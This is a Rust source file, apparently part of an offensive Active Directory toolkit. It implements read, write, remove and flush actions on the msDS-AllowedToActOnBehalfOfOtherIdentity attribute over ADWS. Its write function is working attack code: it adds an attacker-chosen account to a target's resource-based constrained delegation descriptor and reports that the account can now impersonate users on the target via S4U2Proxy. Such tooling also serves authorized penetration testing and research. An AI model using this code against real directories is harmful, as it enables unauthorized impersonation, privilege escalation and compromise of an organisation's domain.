//! RBCD over ADWS: read / write / remove / flush
//! `msDS-AllowedToActOnBehalfOfOtherIdentity`, mirroring the LDAP action.

use anyhow::{anyhow, Result};
use adws_rs::{AdwsClient, Mod, Scope, Value};

use crate::actions::common::{base_dn, sd};
use crate::args::Options;
use crate::shlog;

use super::find_object;

const RBCD_ATTR: &str = "msDS-AllowedToActOnBehalfOfOtherIdentity";

/// Read the raw RBCD descriptor bytes and its parsed (SID, ace_type) entries.
async fn read_rbcd(client: &mut AdwsClient, target_dn: &str) -> Result<(Vec<u8>, Vec<(Vec<u8>, u8)>)> {
    let entries = client
        .search(target_dn, Scope::Base, "(objectClass=*)", &[RBCD_ATTR], None, false)
        .await
        .map_err(|e| anyhow!("ADWS read of target: {e}"))?;
    let e = entries.into_iter().next().ok_or_else(|| anyhow!("could not read target object"))?;
    let raw = e.bin_attrs.get(RBCD_ATTR).and_then(|v| v.first().cloned()).unwrap_or_default();
    let parsed = if raw.is_empty() { vec![] } else { sd::parse_dacl_entries(&raw) };
    Ok((raw, parsed))
}

async fn write_sd(client: &mut AdwsClient, target_dn: &str, entries: &[(Vec<u8>, u8)]) -> Result<()> {
    let aces: Vec<Vec<u8>> = entries.iter().map(|(s, _)| sd::allow_ace(s)).collect();
    let new_sd = sd::build_sd(&sd::admin_sid(), &aces);
    client
        .modify(target_dn, &[Mod::replace(RBCD_ATTR, vec![Value::Bytes(new_sd)])], None)
        .await
        .map_err(|e| anyhow!("RBCD write failed: {e}"))?;
    Ok(())
}

pub async fn read(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref().ok_or_else(|| anyhow!("--delegate-to required"))?;
    let base = base_dn(&opts.domain);
    let (target_dn, _) = find_object(client, &base, target).await?;
    let (_, entries) = read_rbcd(client, &target_dn).await?;
    if entries.is_empty() {
        shlog!("{RBCD_ATTR} is empty for {target}");
    } else {
        shlog!("accounts allowed to act on behalf of '{target}':");
        for (sid_b, _) in &entries {
            shlog!("    {}", sd::sid_to_str(sid_b));
        }
    }
    Ok(())
}

pub async fn write(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref().ok_or_else(|| anyhow!("--delegate-to required"))?;
    let from = opts.delegate_from.as_deref().ok_or_else(|| anyhow!("--delegate-from required"))?;
    let base = base_dn(&opts.domain);

    let (target_dn, _) = find_object(client, &base, target).await?;
    let (_, from_sid) = find_object(client, &base, from).await?;
    let from_sid_str = sd::sid_to_str(&from_sid);

    let (_, mut entries) = read_rbcd(client, &target_dn).await?;
    if entries.iter().any(|(s, _)| sd::sid_to_str(s) == from_sid_str) {
        shlog!("'{from}' can already act on behalf of '{target}' - not modifying");
        return Ok(());
    }
    entries.push((from_sid, 0x00));
    write_sd(client, &target_dn, &entries).await?;
    shlog!("'{from}' can now impersonate users on '{target}' via S4U2Proxy");
    Ok(())
}

pub async fn remove(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref().ok_or_else(|| anyhow!("--delegate-to required"))?;
    let from = opts.delegate_from.as_deref().ok_or_else(|| anyhow!("--delegate-from required"))?;
    let base = base_dn(&opts.domain);

    let (target_dn, _) = find_object(client, &base, target).await?;
    let (_, from_sid) = find_object(client, &base, from).await?;
    let from_sid_str = sd::sid_to_str(&from_sid);

    let (_, entries) = read_rbcd(client, &target_dn).await?;
    let filtered: Vec<(Vec<u8>, u8)> =
        entries.into_iter().filter(|(s, _)| sd::sid_to_str(s) != from_sid_str).collect();
    write_sd(client, &target_dn, &filtered).await?;
    shlog!("RBCD entry for '{from}' removed from '{target}'");
    Ok(())
}

pub async fn flush(client: &mut AdwsClient, opts: &Options) -> Result<()> {
    let target = opts.delegate_to.as_deref().ok_or_else(|| anyhow!("--delegate-to required"))?;
    let base = base_dn(&opts.domain);
    let (target_dn, _) = find_object(client, &base, target).await?;
    client
        .modify(&target_dn, &[Mod::delete_all(RBCD_ATTR)], None)
        .await
        .map_err(|e| anyhow!("flush_rbcd failed: {e}"))?;
    shlog!("RBCD flushed for '{target}'");
    Ok(())
}
